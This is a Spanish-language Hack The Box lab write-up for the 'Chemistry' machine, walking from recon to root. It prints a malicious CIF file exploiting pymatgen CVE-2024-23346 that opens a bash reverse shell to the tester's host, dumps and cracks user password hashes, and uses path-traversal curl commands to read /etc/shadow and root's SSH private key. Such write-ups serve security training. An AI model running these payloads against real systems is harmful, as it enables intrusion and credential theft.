---
title: Chemistry
description: Chemistry es una máquina Linux de dificultad fácil que presenta una vulnerabilidad de Ejecución Remota de Código (RCE) en la biblioteca de Python pymatgen (CVE-2024-23346), al subir un archivo CIF malicioso al sitio web alojado en el analizador CIF del objetivo. Tras descubrir y descifrar los hashes, nos autenticamos en el objetivo mediante SSH como usuario rosa. Para la escalada de privilegios, explotamos una vulnerabilidad de Path Traversal que provoca una Lectura Arbitraria de Archivos en una biblioteca de Python llamada AioHTTP (CVE-2024-23334), donde utiliza en la aplicación web que se ejecuta internamente para leer la flag de root. 
date: 2024-11-04
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-chemistry/chemistry_logo.png
categories:
  - Hack The Box
  - Machines
tags:
  - linux
  - hack the box
  - tcp
  - ssh
  - upnp
  - rce
  - password attacks
  - port forwarding
  - fuzzing web
  - lfi
  - information gathering
  - web analysis
  - foothold
  - user pivoting
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.
```terminal
/home/kali/Documents/htb/machines/chemistry:-$ ping -c 1 10.10.11.38
PING 10.10.11.38 (10.10.11.38) 56(84) bytes of data.
64 bytes from 10.10.11.38: icmp_seq=1 ttl=63 time=256 ms

--- 10.10.11.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 256.312/256.312/256.312/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 10.10.11.38
Host: 10.10.11.38 ()	Status: Up
Host: 10.10.11.38 ()	Ports: 22/open/tcp//ssh///, 5000/open/tcp//upnp///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ nmap -sCV -p22,5000 -vvv -oN nmap2 10.10.11.38
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Mon, 04 Nov 2024 01:28:56 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/3%Time=67282355%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Mon,\x2004\x20Nov\x202024\x2001:28:56\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ whatweb 10.10.11.38:5000
http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```

---
## Web Analysis

La página presenta opciones para iniciar sesión y registrarse. Se crea una cuenta y se accede al sistema.

![](assets/img/htb-writeup-chemistry/chemistry1_1.png)

En el dashboard, hay una utilidad para subir archivos de tipo CIF.

![](assets/img/htb-writeup-chemistry/chemistry1_2.png)

Se proporciona un archivo de ejemplo, al inspeccionarlo, se observa la siguiente estructura.

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ wget http://10.10.11.38:5000/static/example.cif
```
```terminal
/home/kali/Documents/htb/machines/chemistry:-$ cat example.cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

---
## Foothold

El recurso [Arbitrary code execution when parsing CFI files](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) describe cómo es posible ejecutar comandos al procesar este tipo de archivos.

Se crea un archivo CIF malicioso basado en la información del recurso.

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ cat example.cif
data_5yOhtAoR
_audit_creation_date 2018-06-08
_audit_creation_method "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in
().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" +
"classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("bash -c \'/bin/bash -i >& /dev/tcp/10.10.16.79/4321 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
```terminal
/home/kali/Documents/htb/machines/chemistry:-$ nc -lnvp 4321
	listening on [any] 4321 ...
```

![](assets/img/htb-writeup-chemistry/chemistry1_3.png)

```terminal
	... connect to [10.10.16.79] from (UNKNOWN) [10.10.11.38] 33946
$ whoami
app
```

---
## User Pivoting

```terminal
$ script /dev/null -c bash

app@chemistry:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

En la base de datos SQLite, se listan los usuarios junto con sus hashes de contraseña.

```terminal
app@chemistry:~/instance$ sqlite3 database.db

sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
```

El hash de el usuario `rosa` se identifica como MD5 y se intenta recuperar su valor.

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ hashcat --show '63ed86ee9f624c7b14f1d4f43dc251a5'
   # | Name                                            | Category
=====+=================================================+==============================
   0 | MD5                                             | Raw Hash
```

Utilizo [CrackStation](https://crackstation.net/) para descifrar la contraseña.

![](assets/img/htb-writeup-chemistry/chemistry2_1.png)

```terminal
app@chemistry:~/instance$ su rosa
Password:unicorniosrosados

rosa@chemistry:~$ cat user.txt
```

---
## Privilege Escalation

Encuentro un servicio corriendo en el puerto `8080`.

```terminal
rosa@chemistry:~$ ss -tulnp
```

![](assets/img/htb-writeup-chemistry/chemistry3_1.png)

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38 -f -N
rosa@10.10.11.38's password: unicorniosrosados
```

![](assets/img/htb-writeup-chemistry/chemistry3_2.png)

Escaneo la web en busca de directorios.

```terminal
$ dirb http://127.0.0.1:8080/
---- Scanning URL: http://127.0.0.1:8080/ ----
+ http://127.0.0.1:8080/assets (CODE:403|SIZE:14)
```

Identifico que el directorio encontrado es vulnerable a Local File Inclusion

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ curl -s --path-as-is http://localhost:8080/assets/../../../../../../etc/shadow
root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
```

Y de esta forma, obtiengo la clave privada SSH del usuario `root`.

```terminal
/home/kali/Documents/htb/machines/chemistry:-$ curl -s --path-as-is http://localhost:8080/assets/../../../../../../root/.ssh/id_rsa > id_rsa

/home/kali/Documents/htb/machines/chemistry:-$ chmod 600 id_rsa

/home/kali/Documents/htb/machines/chemistry:-$ ssh -i id_rsa root@10.10.11.38

root@chemistry:~# cat root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/631" target="_blank">Chemistry Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
